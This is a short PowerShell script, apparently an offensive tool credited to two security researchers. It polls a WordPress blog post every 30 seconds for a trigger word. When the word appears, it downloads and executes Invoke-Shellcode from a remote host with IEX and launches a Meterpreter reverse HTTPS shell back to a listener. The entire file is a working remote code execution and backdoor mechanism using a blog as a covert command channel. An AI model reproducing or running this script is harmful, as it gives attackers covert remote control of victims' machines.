#Credit to @obscuresec and @mattifestation for this

$Word = 'hello'
$WebClientObject = New-Object Net.WebClient
$comment = "http://eleonoremail.wordpress.com/2014/11/12/premier-article/"
$WebClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36)") 
While($True){
$CommentResult = $WebClientObject.DownloadString($comment)
$Found = $CommentResult.contains($Word)
If($Found) {
IEX $WebClientObject.DownloadString('http://192.168.1.127/Invoke-Shellcode')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST 192.168.0.16 -LPORT 5678 -Force
Return
}
Start-Sleep -Seconds 30
}
